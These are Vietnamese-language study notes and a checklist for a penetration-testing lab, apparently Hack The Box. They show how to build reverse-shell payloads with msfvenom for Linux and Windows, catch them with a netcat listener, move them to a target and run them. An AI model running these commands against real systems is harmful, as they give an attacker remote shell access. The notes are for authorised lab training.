# Crafting Payloads with MSFvenom

## Ý chính

MSFvenom là công cụ trong Metasploit dùng để tạo payload thủ công. Khi ta không thể trực tiếp khai thác target qua mạng bằng exploit module, ta có thể tạo payload thành file rồi chuyển sang target để thực thi.

Payload thường dùng trong section này là reverse shell.

## Liệt kê payload có sẵn

```bash
msfvenom -l payloads
```
Tên payload thường có dạng:

```
<platform>/<architecture>/<payload_type>
```

Ví dụ:

```
linux/x64/shell_reverse_tcp
windows/shell_reverse_tcp
windows/meterpreter/reverse_tcp
windows/meterpreter_reverse_tcp
```

## Staged vs Stageless

### Staged payload

Ví dụ:

```
windows/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp
```

Đặc điểm:

- Chia payload thành nhiều giai đoạn.
- Stage đầu nhỏ.
- Sau khi chạy, stage tải phần payload còn lại từ attacker.
- Có thể không ổn định nếu mạng yếu.

### Stageless payload

Ví dụ:

```
windows/meterpreter_reverse_tcp
linux/x64/shell_reverse_tcp
```

Đặc điểm:

- Toàn bộ payload nằm trong một file/phần duy nhất.
- Khi chạy sẽ connect về attacker ngay.
- Thường ổn định hơn trong môi trường mạng kém.

## Tạo payload Linux ELF

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<tun0-ip> LPORT=443 -f elf > createbackup.elf
```

## Tạo payload Windows EXE

```
msfvenom -p windows/shell_reverse_tcp LHOST=<tun0-ip> LPORT=443 -f exe > payload.exe
```

## Mở listener nhận shell

```
sudo nc -lvnp 443
```

## Ghi nhớ

- `LHOST`: IP máy attacker, thường là IP `tun0` trong HTB.
- `LPORT`: port attacker lắng nghe.
- `-p`: chọn payload.
- `-f`: chọn format output.
- `>`: ghi payload ra file.
- Payload phải được chạy trên target thì attacker mới nhận shell.

---
# MSFvenom Payload Lab Checklist  
  
## 1. Xác định target  
  
- [ ] Target là Linux hay Windows?  
- [ ] Target là x86 hay x64?  
- [ ] Mình cần shell thường hay Meterpreter?  
- [ ] Mình muốn reverse shell hay bind shell?  
  
## 2. Xác định IP attack box  
  
```bash  
ip -4 addr show tun0
```
-  Ghi lại IP `tun0`.
    
-  Dùng IP này làm `LHOST`.
    
## 3. Chọn payload phù hợp

Linux x64 reverse shell:

```
linux/x64/shell_reverse_tcp
```

Windows reverse shell:

```
windows/shell_reverse_tcp
```

Windows Meterpreter staged:

```
windows/meterpreter/reverse_tcp
```

Windows Meterpreter stageless:

```
windows/meterpreter_reverse_tcp
```

## 4. Tạo payload Linux

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<tun0-ip> LPORT=443 -f elf > createbackup.elf
```

## 5. Tạo payload Windows

```
msfvenom -p windows/shell_reverse_tcp LHOST=<tun0-ip> LPORT=443 -f exe > payload.exe
```

## 6. Mở listener

```
sudo nc -lvnp 443
```

## 7. Chuyển payload sang target

Tuỳ lab có thể dùng:

- Web server Python
    
- SMB share
    
- RDP copy/paste
    
- wget/curl
    
- certutil trên Windows
    
- upload form nếu là web lab
    

## 8. Chạy payload trên target

Linux:

```
chmod +x createbackup.elf
./createbackup.elf
```

Windows:

```
payload.exe
```

## 9. Kiểm tra shell

Sau khi payload chạy, listener phải hiện connection.

Linux shell test:

```
whoami
hostname
pwd
id
```

Windows shell test:

```
whoami
hostname
cd
dir
```

## 10. Troubleshooting

-  `LHOST` đã đúng IP `tun0` chưa?
    
-  Listener có mở trước khi chạy payload không?
    
-  `LPORT` trong payload và listener có giống nhau không?
    
-  Firewall có chặn outbound port không?
    
-  Payload có đúng OS/architecture không?
    
-  File có quyền execute chưa?
    
-  Windows Defender/AV có xoá payload không?